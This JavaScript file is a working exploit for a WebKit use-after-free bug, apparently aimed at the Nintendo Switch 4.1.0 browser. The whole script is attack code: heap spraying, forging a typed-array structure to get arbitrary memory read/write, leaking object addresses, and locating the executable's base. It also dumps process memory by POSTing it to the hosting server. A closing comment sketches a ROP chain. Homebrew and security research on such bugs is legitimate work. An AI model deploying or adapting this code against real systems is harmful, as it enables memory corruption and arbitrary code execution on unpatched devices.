// Help image: http://cjuub.se/u/1807241715257.png
// based on:
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1319&can=1&q=webkit&sort=-id
// https://github.com/reswitched/pegaswitch/commit/278fffe8016f8d83302579adf783b0efbee50f95
//
// Can be run on Nintendo Switch 4.1.0 using reswitched project or other hosting software. 

// Create a large uint32array which internal array will later be freed due to the bug. 
// Once freed we will still be able to access the freed internal array through 'arr'. 
arr = new Uint32Array(0x10000);

// Once the bug is triggered, the internal array will be interpreted as a string in 
// slow_path_get_direct_pname. In order to pass checks for the member m_hashAndFlags 
// we set it to 0xb0.
arr[4] = 0xb0;

// //Uncomment to run with JSC
// function alert(str) {}

function get_read_write_primitive() {

    var o = {};
    for (var i in {foo: 'bar'}) {
        // The value of i we set here is the one that will be interpreted
        // as the property in slow_path_get_direct_pname - we want it to be 'arr' 
        for (i of [arr]) {}

        // Trigger the bug and execute slow_path_get_direct_pname! When returning from
        // slow_path_get_direct_pname we will run the destructor for the temporary
        // Identifier-object which in turn will run the destructor for StringImpl on
        // our internal array. The internal array will now be freed and we can proceed
        // with spraying the heap.
        o[i];
    }

    // // Garbage collect to make sure the freed internal array can be used again
    // for (var i = 0; i < 0x200000; i++) {
    //     new Uint32Array(0x1000);
    // }

    // Spray our objects on the heap.
    var objs = [];
    for (var i = 0; i < 0x2; ++i) {
            objs.push({
            prop_0: 0, prop_1: 0xdead,
            prop_2: 0, prop_3: 0,
            prop_4: 0, prop_5: 0,
            prop_6: 0, prop_7: 0,
        });
    }

    // Find one of our sprayed objects within the freed internal array.
    for (var i = 0; i < (arr.length - 21); ++i) {
        if (arr[i] == 0xdead && arr[i+1] == 0xffff0000) {
            // Our JS object offsets 
            // (JSObjects: JSCell(8 bytes) + 
            //             butterfly(8 bytes (null)) + 
            //             8 JS-integers(8 * 8 bytes))
            var objs_1_off = i - 6;
            var objs_0_off = objs_1_off + 20;
            break;
        }
    }

 
    if (typeof objs_1_off === 'undefined') {
        alert('Could not locate our objects...');
        return;
    }


    // UInt32Array structure: [jscell, butterfly, vector, length, mode]

    // Set cell ID to some low valid ID so that we can increase it until we find
    // the ID for Uint32Array.
    arr[objs_0_off+0] = 0x0000050;
    // arr[objs_0_off+0] = 0x0000010e; // set this for correct id on PC
    // Change type of our custom object to UInt32Array
    arr[objs_0_off+1] = 0x01602400;
    // arr[objs_0_off+1] = 0x01082a00; // correct value on PC?
    // Set UInt32Array 'mode' field to 0.
    arr[objs_0_off+7] = 0;

    // From this point onwards, objs[0] will be interpreted as an array when accessed.

    // Bruteforce to find the cell ID for Uint32Array.
    while (!(objs[0] instanceof Uint32Array)) {
        if (++arr[objs_0_off] >= 0x100000) {
            alert('Could not find structure ID...');
            return;
        }
    }
    

    function leak_obj(obj) {
        // returns the address (pointer) of the internal representation of the object
        objs[1].prop_0 = obj;
        return [arr[objs_1_off+4], arr[objs_1_off+5]];
    }
    
    function write(addr, word, off) {
        // Covert byte-offset to 32-bit index, 0x10 = 4, 0x14 = 5, 0x18 = 6, etc
        off = off >> 2;

        // internal array low
        arr[objs_0_off+4] = addr[0];
        // internal array high
        arr[objs_0_off+5] = addr[1];
        // internal array size, updated to make sure we are editing the array within bounds
        arr[objs_0_off+6] = off + 1;

        // write 'word' at offset into the JSArray structure for the view (created below)
        objs[0][off] = word;
    }
    
    var view_a = new Uint32Array(0);
    var fobj_a = new Uint32Array(0);
    var fobj_b = { b: 0 };
    
    var view_a_addr = leak_obj(view_a); 
    var view_a_vect = leak_obj(fobj_a);
    
    // Initialize the internal array for view_a:
    //      - internal array pointer to fobj_a
    //      - internal array size to 8
    //      - mode to 1
    write(view_a_addr, view_a_vect[0], 0x10);
    write(view_a_addr, view_a_vect[1], 0x14);
    write(view_a_addr, 8, 0x18);
    write(view_a_addr, 1, 0x1c);
    
    // Set mode for fobj_a to 1
    view_a[7] = 1;

    // We now have a complete arbitrary read/write primitive.
    // By setting view_a[4]=addr_low and view_a[5]=addr_high we overwrite 
    // the pointer to the internal array for fobj_a. This means any array
    // access done with fobj_a will cause a read or write at that address.
    alert("Arbitrary read/write primitive obtained!");

    return {va: view_a, vb: fobj_a, leakee: fobj_b, leakaddr: leak_obj(fobj_b)}
}

function find_base_addr(read_write_prim) {
    function read4(addr, offset) {
        if (arguments.length === 1) { offset = 0; }
      
        read_write_prim.va[4] = addr[0];
        read_write_prim.va[5] = addr[1];
        read_write_prim.va[6] = 1 + offset;
        return read_write_prim.vb[offset];
    }

    function read8(addr, offset) {
        if (arguments.length === 1) { offset = 0; }
        return [read4(addr, offset), read4(addr, offset + 1)];
    }

    function get_addr(obj) {
        read_write_prim.leakee['b'] = obj;
        return read8(read_write_prim.leakaddr, 4);
    }

    // The next few lines selects an arbitrary webkit internal function 
    // pointer so that we get an address to the .text-segment for the webkit process.

    var func_obj = document.getElementById;
    var func_obj_addr = get_addr(func_obj);
    // Call the targeted function object to make sure it caches the internal 
    // function address in func_obj at offset 8 and 9.
    document.getElementById('');
    var internal_func_addr = read8(func_obj_addr, 6);

    // Search backwards in memory until we find the magic 'NRO0' in the NRO header.
    // 4 bytes before this is the start of the executable in memory, and contains information 
    // about segment locations (hence we read at offset 4 below).
    base_addr = read8(internal_func_addr, 8);
    while (read4(base_addr, 4) !== 0x304F524E) {
        base_addr[0] -= 0x4;
    }

    alert("Base address is located at 0x" + base_addr[1].toString(16) + base_addr[0].toString(16));

    alert(read4(base_addr, read4(base_addr, 1) / 4).toString(16));
    
    return base_addr;
}

function dump_wc_process(read_write_prim, wc_base_addr) {
    // This functions works but stops dumping prematurely for some reason.
    // Maybe split the size up? 

    function send_to_host(view) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/filedump', false);
        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
        xhr.setRequestHeader('Content-Disposition', 'dump.bin');
        xhr.send(view);
    }

    // Set read/write primitive to an array spanning the memory we want to dump.
    read_write_prim.va[4] = wc_base_addr[0];
    read_write_prim.va[5] = wc_base_addr[1];
    read_write_prim.va[6] = read_write_prim.vb[6] / 4;
    
    alert('NRO size: 0x' + read_write_prim.vb[6].toString(16) + ' bytes');

    send_to_host(read_write_prim.vb);
    alert('Data dumped!');
}

read_write_prim = get_read_write_primitive();
wc_base_addr = find_base_addr(read_write_prim);
dump_wc_process(read_write_prim, wc_base_addr);

// TODO ROP chain can be obtained by doing the following:
// 1. Call gadgets (by overwriting JS function pointers) to somehow leak the stack pointer address into our JS code.
// 2. Create a fake stack by allocating an array and then point the leaked SP to it. Write ROP code into this fake stack and then execute a return statement-gadget to trigger the ROP.
